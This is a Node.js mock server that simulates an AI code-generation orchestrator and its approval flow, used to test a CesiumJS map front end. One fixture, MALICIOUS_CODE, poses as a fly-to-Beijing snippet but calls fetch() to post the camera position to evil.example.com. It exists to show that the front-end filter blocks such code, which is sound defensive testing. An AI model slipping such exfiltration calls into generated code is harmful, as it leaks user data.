#!/usr/bin/env node
// 文件作用：mock-codegen-orchestrator Node ES 模块
// 作者：JasonLee <shuiyuntian@foxmail.com>
// 创建日期：2026-07-23
// 版本：1.0.1
// 修改记录：
//   - 1.0.1 (2026-10-05) 包更名收口 ai-assistant→ai-assistant-mcp：注释同步新名
//   - 1.0.0 (2026-07-23) 初始创建
//
// 版权所有 (C) 2026 AGRSEarth 项目

/**
 * mock-codegen-orchestrator —— P3-B codegen 前端联调用模拟 orchestrator（非产品代码）。
 *
 * 背景：orchestrator P3-A（cesium_execute_code 本地工具）并行实现中尚未就绪。
 * 本脚本按既定契约模拟其协议面，供 ai-assistant-mcp 前端 codegen 执行侧端到端演示：
 *  - POST /chat/session            → {sessionId}
 *  - POST /chat                    → UI message stream（reasoning → tool-input-available
 *                                    → data-tool-approval(riskLevel=codegen, args={intent,code})
 *                                    → 挂起等审批 → tool-output-available → text → finish）
 *  - POST /chat/approval           → {sessionId, callId, approved} 放行挂起流
 *  - GET  /channel/events          → SSE（connected + heartbeat，不收发命令）
 *  - POST /channel/result          → {success:true}
 *  - GET  /scripts/* /cesium/*     → 静态 serve（harness 与本地 Cesium build）
 *
 * 场景（按用户消息关键字）：
 *  - 含「拦截」→ 生成含 fetch( 的恶意代码（演示前端防御 blocked）
 *  - 其他     → 生成正常代码（飞上海 + 添加青色标签 + 打印实体数）
 *
 * 用法：node scripts/mock-codegen-orchestrator.mjs [port=9601]
 */
import express from "express";
import path from "node:path";
import { fileURLToPath } from "node:url";

const PORT = Number(process.argv[2] ?? 9601);
const PKG_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

/** 正常场景代码（仅使用 Cesium/viewer 自由变量，24 行，演示折叠展开） */
const BENIGN_CODE = `// 飞到上海并添加一个青色标签
const lon = 121.4737;
const lat = 31.2304;
const dest = Cesium.Cartesian3.fromDegrees(lon, lat, 8000);
viewer.camera.flyTo({
  destination: dest,
  orientation: {
    heading: 0,
    pitch: Cesium.Math.toRadians(-55),
    roll: 0
  },
  duration: 2
});
const ent = viewer.entities.add({
  id: "codegen-shanghai-label",
  position: Cesium.Cartesian3.fromDegrees(lon, lat, 0),
  label: {
    text: "上海 (codegen)",
    font: "16px sans-serif",
    fillColor: Cesium.Color.CYAN,
    outlineColor: Cesium.Color.BLACK,
    outlineWidth: 2,
    style: Cesium.LabelStyle.FILL_AND_OUTLINE
  },
  point: { pixelSize: 12, color: Cesium.Color.CYAN }
});
console.log("codegen done, entity:", ent.id);`;

/** 恶意场景代码（含 fetch( —— 应被前端正则兜底拦截） */
const MALICIOUS_CODE = `// 伪装成飞北京的代码，实际夹带数据外传
const dest = Cesium.Cartesian3.fromDegrees(116.4074, 39.9042, 8000);
viewer.camera.flyTo({ destination: dest, duration: 2 });
fetch("https://evil.example.com/collect", {
  method: "POST",
  body: JSON.stringify({ cam: viewer.camera.position })
});`;

/** 在途审批：callId → {res, code, intent, description} */
const pending = new Map();

const app = express();
app.use(express.json({ limit: "1mb" }));

app.get("/health", (_req, res) => res.json({ status: "ok", mock: true }));

// 静态：harness 与本地 Cesium build（与 orchestrator 相同的挂载约定）
app.use("/scripts", express.static(path.join(PKG_ROOT, "scripts")));
const cesiumDir = path.resolve(
  PKG_ROOT,
  "../../../../platform/frontend/gis-platform-ui/node_modules/cesium/Build/CesiumUnminified",
);
app.use("/cesium", express.static(cesiumDir));

app.post("/chat/session", (_req, res) => {
  res.json({ sessionId: `mock-${Math.random().toString(36).slice(2, 10)}` });
});

app.get("/channel/events", (req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "X-Accel-Buffering": "no",
  });
  res.write(`data: ${JSON.stringify({ type: "connected", sessionId: req.query.sessionId })}\n\n`);
  const hb = setInterval(() => res.write(`data: ${JSON.stringify({ type: "heartbeat" })}\n\n`), 30000);
  req.on("close", () => clearInterval(hb));
});

app.post("/channel/result", (_req, res) => res.json({ success: true }));

/** 从请求消息中提取用户文本（兼容 content 字符串与 parts 两种形态） */
function userText(messages) {
  const last = [...(messages || [])].reverse().find((m) => m.role === "user");
  if (!last) return "";
  if (typeof last.content === "string") return last.content;
  const part = (last.parts || []).find((p) => p && p.type === "text");
  return part?.text || "";
}

function sseWrite(res, part) {
  res.write(`data: ${JSON.stringify(part)}\n\n`);
}

app.post("/chat", (req, res) => {
  const text = userText(req.body?.messages);
  const malicious = text.includes("拦截");
  const intent = malicious
    ? "飞到上海（实际夹带数据外传，应被前端拦截）"
    : "飞到上海并添加一个青色标签";
  const description = malicious ? "恶意代码场景（前端防御演示）" : "codegen 正常场景";
  const code = malicious ? MALICIOUS_CODE : BENIGN_CODE;
  const callId = `call_${Math.random().toString(36).slice(2, 12)}`;

  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "X-Accel-Buffering": "no",
  });

  // reasoning + 工具入参 + codegen 审批（riskLevel=codegen，args={intent, description, code}）
  sseWrite(res, { type: "start", messageId: `msg_${Date.now()}` });
  sseWrite(res, { type: "start-step" });
  sseWrite(res, { type: "reasoning-start", id: "reasoning-0" });
  for (const d of ["用户", "希望", "执行", "代码", "，", "生成", "并", "申请", "审批", "。"]) {
    sseWrite(res, { type: "reasoning-delta", id: "reasoning-0", delta: d });
  }
  sseWrite(res, { type: "reasoning-end", id: "reasoning-0" });
  sseWrite(res, {
    type: "tool-input-available",
    toolCallId: callId,
    toolName: "cesium_execute_code",
    input: { intent, description },
  });
  sseWrite(res, {
    type: "data-tool-approval",
    id: callId,
    data: {
      callId,
      tool: "cesium_execute_code",
      args: { intent, description, code },
      reason: "codegen 操作：执行模型生成的 CesiumJS 代码（已经后端 AST 校验，批准后在浏览器主页面执行）",
      riskLevel: "codegen",
    },
  });

  // 挂起等审批回执（res close 时才清理；req 的 close 在请求体收完即触发，不能用来判断连接存活）
  pending.set(callId, { res, code, intent, description, text });
  res.on("close", () => pending.delete(callId));
});

app.post("/chat/approval", (req, res) => {
  const { callId, approved } = req.body ?? {};
  const entry = pending.get(callId);
  if (!entry) {
    res.status(404).json({ error: "no pending approval for callId" });
    return;
  }
  pending.delete(callId);
  const { res: stream, code } = entry;

  if (approved) {
    // 契约：批准回执后工具返回 {code, approvedForExecution:true}（orchestrator 不执行代码）
    sseWrite(stream, {
      type: "tool-output-available",
      toolCallId: callId,
      output: { code, approvedForExecution: true },
    });
  } else {
    // 契约：拒绝 → tool-output-available（denied，MCP CallToolResult 形态）
    sseWrite(stream, {
      type: "tool-output-available",
      toolCallId: callId,
      output: {
        content: [
          {
            type: "text",
            text: "用户拒绝了操作 cesium_execute_code（denied）。该操作未执行；用户已明确拒绝，禁止重试同一或等效操作，直接向用户说明结果并致歉。",
          },
        ],
        isError: true,
      },
    });
  }
  const summary = approved
    ? "\n\n代码已在浏览器主页面执行，请查看地图变化与工具卡执行结果。"
    : "\n\n好的，代码执行已取消，未对地图做任何改动。";
  for (const ch of summary.split("")) {
    sseWrite(stream, { type: "text-delta", id: "txt-0", delta: ch });
  }
  sseWrite(stream, { type: "finish" });
  stream.write("data: [DONE]\n\n");
  stream.end();
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`[mock-codegen-orchestrator] listening on http://localhost:${PORT}`);
  console.log(`  harness: http://localhost:${PORT}/scripts/p1-harness.html`);
});
